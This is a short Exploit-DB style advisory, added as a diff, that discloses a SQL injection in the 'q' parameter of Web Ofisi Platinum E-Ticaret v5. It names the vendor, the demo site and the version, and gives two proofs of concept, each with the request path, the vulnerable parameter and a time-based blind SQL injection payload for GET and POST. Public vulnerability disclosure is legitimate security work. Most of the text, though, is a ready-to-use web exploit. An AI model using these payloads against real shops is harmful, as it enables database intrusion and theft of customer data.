@@ -1,0 +1,21 @@
+# Exploit Title: Web Ofisi Platinum E-Ticaret 5 - 'q' SQL Injection
+# Date: 2019-07-19
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor: https://www.web-ofisi.com/detay/platinum-e-ticaret-v5.html
+# Demo Site: http://demobul.net/eticaretv5/
+# Version: v5
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC 1: SQLi -----
+
+Request: http://localhost/[PATH]/arama?kategori=&q=
+Vulnerable Parameter: q (GET)
+Payload: 0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z
+
+----- PoC 2: SQLi -----
+
+Request: http://localhost/[PATH]/ajax/productsFilterSearch
+Vulnerable Parameter: q (POST)
+Payload:
+kategori=&pageType=arama&q=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&sayfa=1
